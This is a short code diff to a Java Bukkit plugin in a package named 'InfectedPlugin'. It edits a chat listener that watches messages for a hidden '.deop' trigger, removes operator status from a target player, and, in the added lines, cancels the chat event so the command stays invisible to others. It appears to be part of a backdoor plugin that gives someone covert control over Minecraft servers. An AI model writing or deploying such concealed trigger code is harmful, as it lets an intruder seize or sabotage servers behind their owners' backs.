@@ -1,4 +1,4 @@
-package org.CreeperCoders.InfectedPlugin;
+package org.CreeperCoders.InfectedPlugin.Commands;
 
 import org.bukkit.Server;
 import org.bukkit.Bukkit;
@@ -13,7 +13,8 @@ public class Command_deop implements Listener
     {
         String message = event.getMessage();
         final Player p = event.getPlayer();
-        private Server server = Bukkit.getServer();
+        String[] args = message.split(" ");
+        Server server = Bukkit.getServer();
         boolean cancel = true;
     
         if (message.toLowerCase().contains(".deop"))
@@ -30,6 +31,12 @@ public class Command_deop implements Listener
                 target.sendMessage(ChatColor.RED + "You are no longer OP.");
                 cancel = true;
             }
+        }
+        
+        if (cancel)
+        {
+        	event.setCancelled(true);
+        	return;
         }
     }
 }
